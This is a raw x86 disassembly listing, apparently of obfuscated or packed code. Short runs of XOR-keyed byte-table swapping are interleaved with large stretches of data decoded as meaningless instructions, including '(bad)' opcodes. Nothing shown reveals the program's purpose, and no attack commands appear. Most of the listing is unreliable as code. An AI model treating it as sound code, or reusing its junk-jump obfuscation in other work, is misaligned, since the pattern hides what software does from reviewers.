  4049e7:	bound  edi,QWORD PTR fs:[ebx]
  4049ea:	jne    0x404a4f
  4049ec:	add    DWORD PTR [ebp+0x51],ecx
  4049ef:	inc    edx
  4049f0:	pop    esp
  4049f1:	xchg   BYTE PTR [ecx+esi*8+0x2],dl
  4049f5:	in     al,dx
  4049f6:	dec    edx
  4049f7:	les    ebp,FWORD PTR [edi]
  4049f9:	aaa    
  4049fa:	or     bl,ch
  4049fc:	stos   DWORD PTR es:[edi],eax
  4049fd:	out    dx,al
  4049fe:	cmp    eax,0xeddde621
  404a03:	inc    ebp
  404a04:	push   ds
  404a05:	sbb    eax,0xe4ad4825
  404a0a:	cmp    DWORD PTR [eax],ebp
  404a0c:	push   cs
  404a0d:	pop    esp
  404a0e:	int3   
  404a0f:	mov    ebx,0xdbd414fb
  404a14:	sub    esp,eax
  404a16:	ret    
  404a17:	sbb    al,0xf6
  404a19:	neg    DWORD PTR [eax-0x4]
  404a1c:	es outs dx,DWORD PTR gs:[esi]
  404a1f:	sbb    al,0x4e
  404a21:	mov    eax,ds:0xce6ff9b5
  404a26:	and    ah,BYTE PTR [ebx]
  404a28:	shl    DWORD PTR ds:0x2f7e2427,0xb6
  404a2f:	push   eax
  404a30:	pop    ebx
  404a31:	dec    ecx
  404a32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a33:	or     al,0xc1
  404a35:	call   0xdc8181e7
  404a3a:	sbb    eax,0xfa15f359
  404a3f:	lock pop eax
  404a41:	out    0x29,eax
  404a43:	out    dx,al
  404a44:	sbb    DWORD PTR [ecx-0x18],esp
  404a47:	push   edi
  404a48:	or     DWORD PTR [ebp+0x76],esp
  404a4b:	inc    edi
  404a4c:	adc    di,WORD PTR [ebp+0x489a0eee]
  404a53:	int    0x48
  404a55:	es jmp 0xfa87:0xcad72de1
  404a5d:	lahf   
  404a5e:	mov    dl,0x35
  404a60:	out    dx,eax
  404a61:	fsubr  st(4),st
  404a63:	adc    DWORD PTR [eax-0x12081720],0x9ccf3a8d
  404a6d:	test   eax,0xf481d04
  404a72:	xchg   ebp,eax
  404a73:	xchg   BYTE PTR [esi+ebx*8],al
  404a76:	pop    ebp
  404a77:	mov    edi,ecx
  404a79:	cmc    
  404a7a:	mov    eax,0xe885b92c
  404a7f:	mov    ds:0xa1cca3c7,al
  404a84:	daa    
  404a85:	retf   0xd617
  404a88:	ds adc ch,ch
  404a8b:	jbe    0x404a0f
  404a8d:	mov    bh,0xc3
  404a8f:	outs   dx,BYTE PTR ds:[esi]
  404a90:	xchg   ecx,eax
  404a91:	clc    
  404a92:	daa    
  404a93:	push   edi
  404a94:	add    eax,DWORD PTR [edi-0x2c331b56]
  404a9a:	imul   DWORD PTR [ebx+eiz*4]
  404a9d:	in     al,dx
  404a9e:	aas    
  404a9f:	xlat   BYTE PTR ds:[ebx]
  404aa0:	cmp    DWORD PTR [ebp+eiz*1-0x38557844],esi
  404aa7:	inc    ebp
  404aa8:	hlt    
  404aa9:	xor    al,BYTE PTR [ebp+0x45c7f89c]
  404aaf:	mov    esp,0xf89c8533
  404ab4:	mov    edx,DWORD PTR [ebp-0x18]
  404ab7:	xor    edx,eax
  404ab9:	add    edx,ecx
  404abb:	jmp    0x404e2b
  404ac0:	mov    edx,DWORD PTR [ebp-0x18]
  404ac3:	xor    edx,eax
  404ac5:	add    edx,DWORD PTR [ebp-0x14]
  404ac8:	mov    edi,DWORD PTR [ebp-0x1c]
  404acb:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ad2:	mov    BYTE PTR [ebp+0xf],dl
  404ad5:	mov    edx,DWORD PTR [ebp-0xc]
  404ad8:	xor    edx,eax
  404ada:	add    edx,DWORD PTR [ebp-0x14]
  404add:	mov    edi,DWORD PTR [ebp-0x1c]
  404ae0:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ae7:	mov    BYTE PTR [ebp+0xb],dl
  404aea:	mov    dl,BYTE PTR [ebp+0xf]
  404aed:	mov    edi,DWORD PTR [ebp-0xc]
  404af0:	xor    edi,eax
  404af2:	add    edi,DWORD PTR [ebp-0x14]
  404af5:	mov    ebx,DWORD PTR [ebp-0x1c]
  404af8:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404aff:	mov    dl,BYTE PTR [ebp+0xb]
  404b02:	mov    edi,DWORD PTR [ebp-0x18]
  404b05:	xor    edi,eax
  404b07:	add    edi,DWORD PTR [ebp-0x14]
  404b0a:	mov    ebx,DWORD PTR [ebp-0x1c]
  404b0d:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404b14:	mov    edx,DWORD PTR [ebp-0x44]
  404b17:	mov    edi,DWORD PTR [ebp-0xc]
  404b1a:	xor    edx,eax
  404b1c:	xor    edi,eax
  404b1e:	add    edx,ecx
  404b20:	jmp    0x404e23
  404b25:	xor    ebx,esi
  404b27:	adc    edx,ebp
  404b29:	shl    ebp,1
  404b2b:	icebp  
  404b2c:	repz xor eax,0x6e3c6a28
  404b32:	push   ebx
  404b33:	scas   eax,DWORD PTR es:[edi]
  404b34:	cmp    eax,0x7e7e22a2
  404b39:	pop    eax
  404b3a:	jl     0x404bba
  404b3c:	jle    0x404b6b
  404b3e:	inc    esp
  404b3f:	mov    ds:0x26992432,eax
  404b44:	push   eax
  404b45:	shl    BYTE PTR [edi],cl
  404b47:	sti    
  404b48:	fwait
  404b49:	in     al,dx
  404b4a:	mov    ah,0x7
  404b4c:	xchg   ecx,eax
  404b4d:	mul    edx
  404b4f:	jge    0x404b1a
  404b51:	push   0x957f986f
  404b56:	pop    edi
  404b57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b58:	xor    eax,DWORD PTR [ebp+ecx*1+0x2606e5d2]
  404b5f:	xchg   edi,eax
  404b60:	mov    al,0x56
  404b62:	imul   ebx,DWORD PTR [eax+ebp*4-0x5a],0xffffffff
  404b67:	ins    BYTE PTR es:[edi],dx
  404b68:	adc    al,0x88
  404b6a:	cdq    
  404b6b:	clc    
  404b6c:	(bad)  
  404b6d:	rcl    DWORD PTR ds:0xcac13b4f,1
  404b73:	jae    0x404b77
  404b75:	jg     0x404bbd
  404b77:	push   cs
  404b78:	pop    edi
  404b79:	cmp    ebp,ecx
  404b7b:	sbb    DWORD PTR ds:0x1e7818bd,ebp
  404b81:	jle    0x404b5f
  404b83:	jp     0x404bc5
  404b85:	dec    edx
  404b86:	daa    
  404b87:	adc    ebx,DWORD PTR [ecx+0x20]
  404b8a:	aad    0x5b
  404b8c:	mov    ecx,0x3819d9d0
  404b91:	cs push cs
  404b93:	popf   
  404b94:	fwait
  404b95:	mov    ebp,0x2e1ac658
  404b9a:	xor    ah,BYTE PTR ds:0x1c253138
  404ba0:	pop    es
  404ba1:	rcr    ch,1
  404ba3:	mov    ebp,0x8b08d4ea
  404ba8:	jbe    0x404b2c
  404baa:	push   ss
  404bab:	mov    ch,0x23
  404bad:	sbb    dl,bh
  404baf:	mov    ecx,0xa2bee69e
  404bb4:	xlat   BYTE PTR ds:[ebx]
  404bb5:	imul   esi,ebx,0xffffff87
  404bb8:	out    dx,al
  404bb9:	imul   esi,DWORD PTR [ebp-0x58],0x93a06682
  404bc0:	scas   eax,DWORD PTR es:[edi]
  404bc1:	adc    BYTE PTR ds:0x89c1,cl
  404bc6:	popf   
  404bc7:	add    edx,DWORD PTR [eax+ebx*8-0x73]
  404bcb:	xor    dl,ch
  404bcd:	adc    DWORD PTR [ebp-0xd],esp
  404bd0:	cmp    DWORD PTR [eax+0x56],ecx
  404bd3:	imul   bh
  404bd5:	cdq    
  404bd6:	jmp    0x71f1:0xe23ce07e
  404bdd:	xchg   edi,eax
  404bde:	mov    BYTE PTR [edi-0x57e4dc8c],al
  404be4:	loop   0x404be6
  404be6:	lea    ebp,[ebp+0x7e5b9ec0]
  404bec:	dec    ebx
  404bed:	push   ebp
  404bee:	aas    
  404bef:	inc    esi
  404bf0:	sub    al,cl
  404bf2:	and    al,0x7e
  404bf4:	jmp    0x957a39f2
  404bf9:	inc    esi
  404bfa:	mov    edx,0x75b869be
  404bff:	leave  
  404c00:	add    esp,ebx
  404c02:	cmp    edx,esp
  404c04:	xchg   ecx,eax
  404c05:	xor    DWORD PTR [esi+ebp*4],ecx
  404c08:	adc    DWORD PTR [eax+ecx*1-0x55c3d6d3],esp
  404c0f:	xchg   BYTE PTR [eax],ch
  404c11:	fstp   TBYTE PTR [ebx]
  404c13:	pop    esi
  404c14:	and    al,0x70
  404c16:	mov    eax,0xb405c96a
  404c1b:	sbb    DWORD PTR [ebp-0x72],edx
  404c1e:	inc    edx
  404c1f:	inc    eax
  404c20:	add    BYTE PTR [ebp-0x1],0xa7
  404c24:	cs push 0xb
  404c27:	push   esi
  404c28:	lods   eax,DWORD PTR ds:[esi]
  404c29:	or     eax,0x6de7fdfb
  404c2e:	xchg   ebx,eax
  404c2f:	mov    esp,0x69d952cf
  404c34:	jne    0x404c28
  404c36:	jmp    0x404c5f
  404c38:	push   0x3c
  404c3a:	jle    0x404c97
  404c3c:	idiv   BYTE PTR [esi+0x4f]
  404c3f:	cdq    
  404c40:	mov    eax,0xbb6dd5bb
  404c45:	scas   eax,DWORD PTR es:[edi]
  404c46:	jle    0x404c03
  404c48:	loopne 0x404ca5
  404c4a:	add    al,0xf3
  404c4c:	mov    ebx,0x1efbee28
  404c51:	mov    esi,0x11a5d0c0
  404c56:	and    DWORD PTR [esi+0x3a],ebx
  404c59:	or     DWORD PTR [ecx-0x6ea7b898],ebp
  404c5f:	aad    0x78
  404c61:	mov    ebp,0x87335fcf
  404c66:	add    DWORD PTR [edx+ebp*8-0x44],eax
  404c6a:	int    0x25
  404c6c:	jecxz  0x404c9a
  404c6e:	jnp    0x404c61
  404c70:	clc    
  404c71:	mov    al,ds:0xff887224
  404c76:	add    DWORD PTR [edi-0x70],ebp
  404c79:	and    edi,ebx
  404c7b:	mov    esi,0x636f583d
  404c80:	leave  
  404c81:	mov    ebp,0xef1d896c
  404c86:	xlat   BYTE PTR ds:[ebx]
  404c87:	sbb    al,0xb2
  404c89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c8a:	stc    
  404c8b:	inc    edx
  404c8c:	out    0x57,eax
  404c8e:	adc    cl,BYTE PTR [esi+0x3c]
  404c91:	jmp    0x404cd8
  404c93:	sbb    ebx,ebx
  404c95:	adc    eax,0x5390badf
  404c9a:	pop    ebx
  404c9b:	add    cl,BYTE PTR [esi-0x1b]
  404c9e:	xchg   DWORD PTR [edx],esp
  404ca0:	xor    DWORD PTR [eax+0x37],esp
  404ca3:	sbb    bh,0x77
  404ca6:	cwde   
  404ca7:	sar    BYTE PTR [ebx+0x19e59545],cl
  404cad:	xchg   ebx,eax
  404cae:	outs   dx,DWORD PTR ds:[esi]
  404caf:	mov    ds:0x288b6b1c,eax
  404cb4:	xor    BYTE PTR [edx-0x6a821912],bh
  404cba:	pop    ebx
  404cbb:	loopne 0x404c84
  404cbd:	push   edi
  404cbe:	aas    
  404cbf:	xlat   BYTE PTR ds:[ebx]
  404cc0:	add    BYTE PTR [ebx-0x4c],dh
  404cc3:	or     dh,BYTE PTR [ecx+ebx*2-0x52]
  404cc7:	fwait
  404cc8:	sbb    BYTE PTR ds:0x4651b3b8,al
  404cce:	sub    dl,ah
  404cd0:	cli    
  404cd1:	rol    DWORD PTR [ebp+0x5b],1
  404cd4:	das    
  404cd5:	ins    BYTE PTR es:[edi],dx
  404cd6:	(bad)  
  404cd7:	xchg   ebx,eax
  404cd8:	div    BYTE PTR [edi-0x61b05f9e]
  404cde:	or     DWORD PTR [esi+edx*8],0x5ee50a91
  404ce5:	out    dx,eax
  404ce6:	aaa    
  404ce7:	mov    ds:0x86a1b574,eax
  404cec:	iret   
  404ced:	lahf   
  404cee:	mov    al,0xa4
  404cf0:	ss dec ebx
  404cf2:	pop    ds
  404cf3:	and    DWORD PTR [edi],ebx
  404cf5:	lods   al,BYTE PTR ds:[esi]
  404cf6:	sub    BYTE PTR [edi+edx*2],0x77
  404cfa:	icebp  
  404cfb:	popf   
  404cfc:	jmp    0xd242:0xb54803d0
  404d03:	js     0x404ce6
  404d05:	call   0xf2658364
  404d0a:	mov    ebx,0xd0e026e9
  404d0f:	repz push ebx
  404d11:	cli    
  404d12:	ins    DWORD PTR es:[edi],dx
  404d13:	jge    0x404d8e
  404d15:	es cmp eax,0xccd4c78f
  404d1b:	cmp    esi,ebx
  404d1d:	stos   DWORD PTR es:[edi],eax
  404d1e:	call   0x4ac6db21
  404d23:	ficom  DWORD PTR [ebx+0x4d]
  404d26:	test   esp,esp
  404d28:	data16 jae 0x404d00
  404d2b:	xlat   BYTE PTR ds:[ebx]
  404d2c:	loope  0x404cfc
  404d2e:	mov    al,BYTE PTR [ecx+eax*1-0x590450ab]
  404d35:	or     al,0x44
  404d37:	inc    edx
  404d38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d39:	and    BYTE PTR [esi+0x58],cl
  404d3c:	loopne 0x404d49
  404d3e:	sub    eax,0xa48d6a06
  404d43:	push   0xb
  404d45:	add    BYTE PTR [eax-0x15a1815b],bh
  404d4b:	adc    DWORD PTR [edx+ebx*4-0x544d205f],edi
  404d52:	leave  
  404d53:	pop    ebx
  404d54:	aas    
  404d55:	int    0xa9
  404d57:	out    dx,al
  404d58:	mov    eax,0x623ad39
  404d5d:	sub    BYTE PTR [ebx],al
  404d5f:	call   DWORD PTR [ebx]
  404d61:	xor    DWORD PTR [ecx+0x23b8f179],eax
  404d67:	or     eax,0x110486bc
  404d6c:	stc    
  404d6d:	test   BYTE PTR [ebx-0x6b],ah
  404d70:	ficom  DWORD PTR [edx]
  404d72:	and    edx,esi
  404d74:	imul   edi,esi,0x5f
  404d77:	adc    eax,DWORD PTR [ecx+0x3c]
  404d7a:	jge    0x404dc2
  404d7c:	add    eax,0x54dfa9b
  404d81:	cli    
  404d82:	mov    eax,ds:0x3c7b6ad0
  404d87:	cmp    eax,0x6fd1e948
  404d8c:	and    al,0xb4
  404d8e:	ds (bad) 
  404d90:	call   DWORD PTR [edx]
  404d92:	aas    
  404d93:	push   0xfffffff5
  404d95:	not    eax
  404d97:	dec    esi
  404d98:	jmp    0x404d44
  404d9a:	pushf  
  404d9b:	jecxz  0x404d1e
  404d9d:	mov    ebx,0x130d7a26
  404da2:	mov    bh,0xc2
  404da4:	cmp    al,0x7e
  404da7:	cmp    ebx,ecx
  404da9:	cli    
  404daa:	nop
  404dab:	sbb    al,0x52
  404dad:	nop
  404dae:	psllw  mm4,QWORD PTR [bp+di]
  404db2:	hlt    
  404db3:	xchg   ecx,edx
  404db5:	xor    eax,0x2ad7cb0f
  404dba:	mov    ah,0xd0
  404dbc:	aaa    
  404dbd:	pop    edx
  404dbe:	mov    esi,0xa1be0cf4
  404dc3:	arpl   cx,sp
  404dc5:	mov    WORD PTR [edi+0x70],ds
  404dc8:	sbb    eax,0x95090101
  404dcd:	xor    eax,0xa4e91dd
  404dd2:	popf   
  404dd3:	outs   dx,BYTE PTR ds:[esi]
  404dd4:	push   edi
  404dd5:	jns    0x404d98
  404dd7:	xor    cl,BYTE PTR [ecx-0x1d]
  404dda:	shr    ah,0x51
  404ddd:	cdq    
  404dde:	sub    al,0x8f
  404de0:	add    edi,DWORD PTR [ebx+ebp*4-0x4b]
  404de4:	xchg   edx,eax
  404de5:	outs   dx,BYTE PTR ds:[esi]
  404de6:	fistp  WORD PTR [edi+esi*1]
  404de9:	push   ebp
  404dea:	add    al,0xe6
  404dec:	dec    ebx
  404ded:	mov    edi,0x5f342244
  404df2:	inc    ebp
  404df3:	xchg   edi,eax
  404df4:	lds    ecx,FWORD PTR [eax+0x5c5fad60]
  404dfa:	adc    ebp,esi
  404dfc:	scas   al,BYTE PTR es:[edi]
  404dfd:	daa    
  404dfe:	outs   dx,DWORD PTR ds:[esi]
  404dff:	and    al,0xeb
  404e01:	push   ebx
  404e02:	add    DWORD PTR [esi+0x7b],edx
  404e05:	outs   dx,BYTE PTR ds:[esi]
  404e06:	xchg   esp,eax
  404e07:	call   0xa3b9b7f1
  404e0c:	pop    es
  404e0d:	call   0xd289:0x5ac476ff
  404e14:	xchg   ecx,eax
  404e15:	jae    0x404e70
  404e17:	or     eax,0x28597686
  404e1c:	pminub mm3,mm3
  404e1f:	push   ds
  404e20:	hlt    
  404e21:	sti    
  404e22:	jne    0x404e27
  404e24:	stc    
  404e25:	imul   edx,edi
  404e28:	add    edx,DWORD PTR [ebp-0x14]
  404e2b:	mov    DWORD PTR [ebp-0x14],edx
  404e2e:	mov    edx,DWORD PTR [ebp-0xc]
  404e31:	mov    edi,DWORD PTR [ebp-0x24]
  404e34:	xor    edx,eax
  404e36:	add    edx,ecx
  404e38:	imul   edx,edi
  404e3b:	mov    edi,DWORD PTR [ebp-0xc]
  404e3e:	xor    edi,eax
  404e40:	sub    edx,edi
  404e42:	mov    edi,DWORD PTR [ebp-0xc]
  404e45:	mov    ebx,DWORD PTR [ebp-0x14]
  404e48:	xor    edi,eax
  404e4a:	add    edi,ecx
  404e4c:	jmp    0x40514f
  404e51:	xlat   BYTE PTR ds:[ebx]
  404e52:	pop    eax
  404e53:	mov    ds:0x51e5b1dc,eax
  404e58:	jno    0x404e33
  404e5a:	stc    
  404e5b:	hlt    
  404e5c:	jb     0x404e31
  404e5e:	aam    0x42
  404e60:	jb     0x404dee
  404e62:	and    DWORD PTR [esi+0x7e],edi
  404e65:	pop    eax
  404e66:	jl     0x404ee6
  404e68:	jle    0x404e56
  404e6a:	or     BYTE PTR [eax-0x39],dh
  404e6d:	cmc    
  404e6e:	add    DWORD PTR [eax+0x5422d77c],0x2ce8bc21
  404e78:	inc    esi
  404e79:	inc    esi
  404e7a:	out    dx,al
  404e7b:	dec    ebx
  404e7c:	pop    ebp
  404e7d:	inc    ecx
  404e7e:	out    0xf4,al
  404e80:	addr16 mov ds:0xc87,eax
  404e84:	xchg   esi,eax
  404e85:	cdq    
  404e86:	pop    ecx
  404e87:	sar    BYTE PTR [ebx-0x11],0xaf
  404e8b:	jmp    0x21f67502
  404e90:	lock repz ror ecx,0xaa
  404e95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e96:	jmp    0x404f0d
  404e98:	push   ebx
  404e99:	cwde   
  404e9a:	in     eax,dx
  404e9b:	add    al,0x23
  404e9d:	mov    al,0xf0
  404e9f:	int    0x9b
  404ea1:	popa   
  404ea2:	int    0xfc
  404ea4:	inc    ecx
  404ea5:	dec    ebp
  404ea6:	jle    0x404e97
  404ea8:	sahf   
  404ea9:	xchg   ebp,eax
  404eaa:	jnp    0x404e61
  404eac:	pop    ss
  404ead:	into   
  404eae:	mov    al,ds:0x9e458611
  404eb3:	ror    DWORD PTR [edi],1
  404eb5:	rcr    BYTE PTR [ebp+0x17],0x3c
  404eb9:	cwde   
  404eba:	xchg   esp,eax
  404ebb:	lock inc ebp
  404ebd:	inc    esi
  404ebe:	and    eax,0xe0e0a587
  404ec3:	scas   al,BYTE PTR es:[edi]
  404ec4:	iret   
  404ec5:	push   0x9316d4f1
  404eca:	das    
  404ecb:	dec    esi
  404ecc:	jecxz  0x404e5e
  404ece:	add    ebp,esi
  404ed0:	fstp   DWORD PTR [esi+0x59158a01]
  404ed6:	emms   
  404ed8:	pushf  
  404ed9:	(bad)  
  404eda:	mov    DWORD PTR [eax],edx
  404edc:	jnp    0x404e68
  404ede:	xchg   esp,eax
  404edf:	sti    
  404ee0:	xchg   ebx,eax
  404ee1:	aad    0xf2
  404ee3:	pop    ss
  404ee4:	(bad)  
  404ee5:	jae    0x404eb7
  404ee7:	pushf  
  404ee8:	in     eax,0xb
  404eea:	mov    ebx,0x79e71003
  404eef:	dec    DWORD PTR [ebx]
  404ef1:	and    DWORD PTR [eax],eax
  404ef3:	loope  0x404f60
  404ef5:	stos   DWORD PTR es:[edi],eax
  404ef6:	ss inc BYTE PTR cs:[ecx+0x22602ff5]
  404efe:	shl    BYTE PTR [ebx-0x5e0b3b5d],1
  404f04:	push   ss
  404f05:	dec    ebx
  404f06:	dec    esp
  404f07:	push   ds
  404f08:	fidivr WORD PTR [edi-0x52b97e73]
  404f0e:	jb     0x404eb0
  404f10:	pop    edx
  404f11:	or     al,0xe1
  404f13:	or     esi,DWORD PTR [edi]
  404f15:	mov    dl,0x25
  404f17:	pop    edi
  404f18:	pop    ebp
  404f19:	ret    
  404f1a:	jge    0x404f36
  404f1c:	loopne 0x404f7b
  404f1e:	pop    esp
  404f1f:	jl     0x404f90
  404f21:	iret   
  404f22:	cmp    DWORD PTR [ebp+0x2bd61148],ecx
  404f28:	ja     0x404ef8
  404f2a:	cli    
  404f2b:	popa   
  404f2c:	out    0xd8,eax
  404f2e:	fimul  WORD PTR [edi+0x64]
  404f31:	and    cl,BYTE PTR [ecx+0x4e]
  404f34:	cmc    
  404f35:	jb     0x404ef8
  404f37:	iret   
  404f38:	inc    ebx
  404f39:	cmp    al,BYTE PTR [edx+0x2c]
  404f3c:	lods   al,BYTE PTR ds:[esi]
  404f3d:	sti    
  404f3e:	mov    WORD PTR [esi-0x54],fs
  404f41:	lea    esi,ds:0x75846436
  404f47:	popa   
  404f48:	sub    al,0xd3
  404f4a:	lock call 0xf062:0x1d77ed28
  404f52:	xchg   edi,eax
  404f53:	adc    esp,DWORD PTR [eax-0x47482724]
  404f59:	arpl   WORD PTR [ecx-0x1d],dx
  404f5c:	jo     0x404fbd
  404f5e:	pop    esi
  404f5f:	dec    edi
  404f60:	mov    eax,0xb26e13f1
  404f65:	xor    BYTE PTR [esi],ch
  404f67:	ret    0x95c1
  404f6a:	push   es
  404f6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f6c:	jo     0x404fa8
  404f6e:	or     eax,0x27521165
  404f73:	adc    eax,DWORD PTR [ebx-0x57]
  404f76:	add    BYTE PTR [esi+0x3553f1ad],dl
  404f7c:	int    0xbf
  404f7e:	sub    al,0x17
  404f80:	ret    
  404f81:	or     al,0xf0
  404f83:	add    dl,BYTE PTR [ecx-0x29183250]
  404f89:	add    DWORD PTR [edi],esi
  404f8b:	mov    cl,0x6f
  404f8d:	xchg   edi,eax
  404f8e:	pop    ecx
  404f8f:	inc    ecx
  404f90:	out    0xef,eax
  404f92:	xchg   edx,eax
  404f93:	inc    ecx
  404f94:	pusha  
  404f95:	mov    eax,ds:0x232c3a64
  404f9a:	push   ebp
  404f9b:	pusha  
  404f9c:	scas   eax,DWORD PTR es:[edi]
  404f9d:	int3   
  404f9e:	jl     0x404fb5
  404fa0:	mov    ebx,cr6
  404fa3:	push   ebp
  404fa4:	mov    ebx,0x88546f2c
  404fa9:	jo     0x404f9f
  404fab:	fs test eax,0x442b2c89
  404fb1:	jno    0x40500c
  404fb3:	test   eax,0xc4be8a02
  404fb8:	fldenv [edx-0x6c342854]
  404fbe:	les    esi,FWORD PTR [edi]
  404fc0:	jle    0x404ff1
  404fc2:	xlat   BYTE PTR ds:[ebx]
  404fc3:	xchg   ebx,esp
  404fc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404fc6:	hlt    
  404fc7:	cmp    eax,0xab0b573
  404fcc:	lds    eax,FWORD PTR [eax+0x2f633cd5]
  404fd2:	xchg   ebp,eax
  404fd3:	aas    
  404fd4:	or     ah,0x67
  404fd7:	packssdw mm5,QWORD PTR [ecx+ebx*2-0xc32e200]
  404fdf:	cmp    DWORD PTR [eax+0x5b],ebp
  404fe2:	jmp    0x486c0b44
  404fe7:	mov    ebx,0xefbd6792
  404fec:	rol    DWORD PTR [ecx-0x35],1
  404fef:	adc    DWORD PTR [edi-0x7c],ebx
  404ff2:	icebp  
  404ff3:	repz loope 0x405067
  404ff6:	lea    edx,[ecx-0x76]
  404ff9:	dec    ebp
  404ffa:	fistp  DWORD PTR [ecx+ebp*4-0x417c454b]
  405001:	cmp    BYTE PTR [ecx-0x6e],al
  405004:	popa   
  405005:	loop   0x40502b
  405007:	arpl   WORD PTR [esi-0xb],dx
  40500a:	dec    eax
  40500b:	out    0x9f,al
  40500d:	dec    edx
  40500e:	je     0x40500b
  405010:	jae    0x405022
  405012:	ret    0xe684
  405015:	pop    edi
  405016:	xchg   ebp,eax
  405017:	nop
  405018:	repz or BYTE PTR [ebp+0x44],0xd7
  40501d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40501e:	add    al,0x69
  405020:	dec    esi
  405021:	pop    es
  405022:	aad    0x79
  405024:	stos   DWORD PTR es:[edi],eax
  405025:	hlt    
  405026:	inc    ebp
  405027:	sbb    ebx,DWORD PTR [ecx+0x7a]
  40502a:	ins    DWORD PTR es:[edi],dx
  40502b:	enter  0xa3f9,0x1e
  40502f:	in     al,0x55
  405031:	jmp    0x58c2:0x1af3ba42
  405038:	jmp    DWORD PTR [eax-0x75]
  40503b:	rol    DWORD PTR [ebp-0x40],1
  40503e:	nop
  40503f:	pop    edi
  405040:	xchg   esi,eax
  405041:	dec    ecx
  405042:	ret    0x5496
  405045:	stc    
  405046:	dec    edi
  405047:	push   edi
  405048:	arpl   WORD PTR ds:0x5340804c,dx
  40504e:	pop    edx
  40504f:	dec    edi
  405050:	xlat   BYTE PTR ds:[ebx]
  405051:	mov    esp,0x3284680b
  405056:	push   cs
  405057:	test   BYTE PTR [edx],bh
  405059:	ret    0x6b94
  40505c:	cli    
  40505d:	in     eax,0x3
  40505f:	xlat   BYTE PTR ds:[ebx]
  405060:	inc    ecx
  405061:	loopne 0x405074
  405063:	dec    ebx
  405064:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405065:	or     dh,cl
  405067:	and    BYTE PTR [edi+0x3e],0xd
  40506b:	and    ecx,DWORD PTR [ebx]
  40506d:	push   edi
  40506e:	rcl    DWORD PTR [eax-0x15b06f88],cl
  405074:	shr    DWORD PTR ds:[ecx-0x7e],1
  405078:	mov    ds:0xbf1a385f,al
  40507d:	aad    0xc3
  40507f:	xchg   DWORD PTR [ebx-0x4b],ebp
  405082:	in     al,dx
  405083:	repnz pop esi
  405085:	xor    DWORD PTR [edi],0x9e9dbb16
  40508b:	loopne 0x405056
  40508d:	pop    eax
  40508e:	mov    eax,0xceeb55be
  405093:	out    dx,al
  405094:	adc    eax,0xc5fe0afc
  405099:	scas   eax,DWORD PTR es:[edi]
  40509a:	adc    edx,DWORD PTR [ebx+eax*1]
  40509d:	push   cs
  40509e:	fcom   QWORD PTR [esi+ebp*4+0x62]
  4050a2:	add    al,0x1b
  4050a4:	xchg   esp,eax
  4050a5:	jmp    0xb366eaa0
  4050aa:	sbb    ebp,DWORD PTR gs:[edi+0x2590048b]
  4050b1:	cmp    ch,BYTE PTR [edx+eax*4-0x56]
  4050b5:	xor    DWORD PTR [ecx-0x61],esp
  4050b8:	lds    ecx,FWORD PTR [edx-0x68e25ab9]
  4050be:	cli    
  4050bf:	sub    al,0xeb
  4050c1:	imul   ecx,eax,0x5d
  4050c4:	aad    0xe8
  4050c6:	outs   dx,DWORD PTR ds:[esi]
  4050c7:	mov    al,ds:0xe54ec05b
  4050cc:	cmp    al,0xb2
  4050ce:	out    dx,eax
  4050cf:	fs mov cl,0x80
  4050d2:	shl    DWORD PTR [edx+0x75],cl
  4050d5:	push   ds
  4050d6:	aad    0x4c
  4050d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4050d9:	or     eax,0x4c59e052
  4050de:	inc    ecx
  4050df:	call   0xfce4:0xc7e7c145
  4050e6:	mov    ch,0x2d
  4050e8:	add    esi,esp
  4050ea:	cwde   
  4050eb:	(bad)  
  4050ec:	enter  0x2564,0xb1
  4050f0:	outs   dx,BYTE PTR ds:[esi]
  4050f1:	rcl    DWORD PTR [ecx+0x2a8ae7fc],1
  4050f7:	mov    bl,0x12
  4050f9:	sti    
  4050fa:	(bad)  [ebx]
  4050fc:	push   edi
  4050fd:	inc    ebx
  4050fe:	jnp    0x4050ea
  405100:	and    eax,esi
  405102:	leave  
  405103:	outs   dx,DWORD PTR ds:[esi]
  405104:	arpl   dx,cx
  405106:	(bad)  [edi-0x11]
  405109:	jl     0x405148
  40510b:	jno    0x405168
  40510d:	daa    
  40510e:	push   0x14
  405110:	push   eax
  405111:	jmp    0x405156
  405113:	and    DWORD PTR [ebx],0xffffff97
  405116:	jo     0x40512c
  405118:	lock lock gs pop ss
  40511c:	mov    ds:0xa7e1c616,al
  405121:	int    0x38
  405123:	(bad)  
  405124:	sahf   
  405125:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405126:	pop    ds
  405127:	stos   DWORD PTR es:[edi],eax
  405128:	push   cs
  405129:	bound  ecx,QWORD PTR [ecx-0x4b2e2e95]
  40512f:	pop    ebx
  405130:	data16 adc ch,dl
  405133:	xchg   ecx,eax
  405134:	push   ebx
  405135:	ror    bh,cl
  405137:	cmp    dl,BYTE PTR [edi]
  405139:	cmp    bl,BYTE PTR [ebx+edx*4+0x2c]
  40513d:	test   eax,0x341fc504
  405142:	adc    BYTE PTR [ebp+0x77f9773],cl
  405148:	enter  0x4f48,0xf0
  40514c:	inc    esi
  40514d:	jg     0x40515b
  40514f:	imul   edi,ebx
  405152:	mov    ebx,DWORD PTR [ebp-0x18]
  405155:	xor    ebx,eax
  405157:	sub    edx,ecx
  405159:	lea    edi,[edi+ebx*1+0x32729b]
  405160:	jmp    0x405463
  405165:	pusha  
  405166:	das    
  405167:	sti    
  405168:	pop    eax
  405169:	push   ecx
  40516a:	push   0x65ca3761
  40516f:	out    0x76,eax
  405171:	in     al,dx
  405172:	rol    BYTE PTR [edi+0x7e2cf625],cl
  405178:	jle    0x4051d2
  40517a:	jl     0x4051fa
  40517c:	jle    0x4051cc
  40517e:	loopne 0x40514a
